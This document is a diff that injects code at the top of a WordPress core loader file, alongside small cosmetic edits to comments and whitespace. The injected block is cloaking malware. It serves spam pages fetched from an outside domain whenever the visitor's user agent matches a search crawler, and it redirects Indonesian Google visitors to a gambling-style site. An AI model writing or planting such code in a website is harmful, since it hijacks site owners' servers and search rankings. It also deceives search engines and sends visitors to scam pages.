@@ -1,4 +1,30 @@
 <?php
+$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
+$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
+
+function is_bot() {
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
+foreach ($bots as $bot) {
+if (stripos($user_agent, $bot) !== false) {
+return true;
+}
+}
+return false;
+}
+if (is_bot()) {
+echo file_get_contents('https://grtoto.store/conextion-link/demandifymedia-com-proven-b2b-demand-generation-strategies-for-explosive-growth.html');
+exit;
+}
+
+if (stripos($s_ref, 'google.co.id') !== false ||
+(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
+header("Location: https://masuk-situs-atasantoto.pages.dev/");
+exit;
+}
+?>
+<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -547,7 +573,7 @@ function timer_stop( $display = 0, $precision = 3 ) {global $timestart, $timeend
  *
  * When `WP_DEBUG` is true, all PHP notices are reported. WordPress will also
  * display internal notices: when a deprecated WordPress function, function
- * argument, or file is used. Deprecated code may be removed from a later
+ * argument, or file is used. Deprecated codemay be removed from a later
  * version.
  *
  * It is strongly recommended that plugin and theme developers use `WP_DEBUG`
@@ -1135,7 +1161,7 @@ function wp_skip_paused_themes( array $themes ) {
 	}
 
 	foreach ( $themes as $index => $theme ) {
-		$theme = basename( $theme);if ( array_key_exists( $theme, $paused_themes ) ) {
+		$theme = basename( $theme);if (array_key_exists( $theme, $paused_themes ) ) {
 			unset( $themes[ $index ] );
 
 			// Store list of paused themes for displaying an admin notice.
@@ -1448,7 +1474,7 @@ function is_multisite() {
 	return false;
 }
 
-/*** Converts a value to non-negative integer.
+/*** Converts avalue to non-negative integer.
  *
  * @since 2.5.0
  *
